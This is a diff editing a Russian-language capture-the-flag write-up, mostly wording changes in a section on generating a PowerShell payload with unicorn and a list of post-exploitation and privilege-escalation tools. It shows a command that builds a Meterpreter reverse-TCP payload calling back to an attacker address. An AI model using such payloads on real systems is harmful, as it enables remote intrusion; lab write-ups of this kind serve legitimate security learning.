@@ -378,7 +378,7 @@ Saved as: sh3ll.ps1
 
 **[\*] Отступление**
 
-[unicorn](https://github.com/trustedsec/unicorn "trustedsec/unicorn: Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.")'ом это можно было бы сделать проще и приятнее (создаваемые файлы: `powershell_attack.txt`, `unicorn.rc`).
+[unicorn](https://github.com/trustedsec/unicorn "trustedsec/unicorn: Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.")'ом это можно сделать еще проще (создаваемые файлы: `powershell_attack.txt`, `unicorn.rc`):
 ```text
 root@kali:~# python unicorn.py windows/meterpreter/reverse_tcp 10.10.14.14 443
 ...
@@ -638,10 +638,10 @@ Hip, hip, hurray! :relieved:
 
 # Разное
 ## Утилиты
-Некоторые другие exploration/exploitation -инструмены (отличные от Metasploit), с помощью которых можно было получить информацию о доступных на машине уязвимостях и захватить суперпользователя:
-  * [Merlin](https://github.com/Ne0nd0g/merlin "Ne0nd0g/merlin: Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang.") (может, этот фреймворк был самым каноничным из-за названия виртуалки?);
-  * [Sherlock](https://github.com/rasta-mouse/Sherlock "rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.");
-  * [Watson](https://github.com/rasta-mouse/Watson "rasta-mouse/Watson").
+Некоторые другие exploration/exploitation -инструменты (отличные от Metasploit), с помощью которых можно было получить информацию о доступных на машине уязвимостях и/или захватить суперпользователя:
+  * [Merlin](https://github.com/Ne0nd0g/merlin "Ne0nd0g/merlin: Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang.") (может, этот фреймворк был бы самым каноничным из-за КДПВ на главной сайта?);
+  * [Sherlock](https://github.com/rasta-mouse/Sherlock "rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.") (старая версия Watson'а);
+  * [Watson](https://github.com/rasta-mouse/Watson "rasta-mouse/Watson") (новая версия Sherlock'а).
 
 Награда ждет, спасибо за внимание :innocent:
 
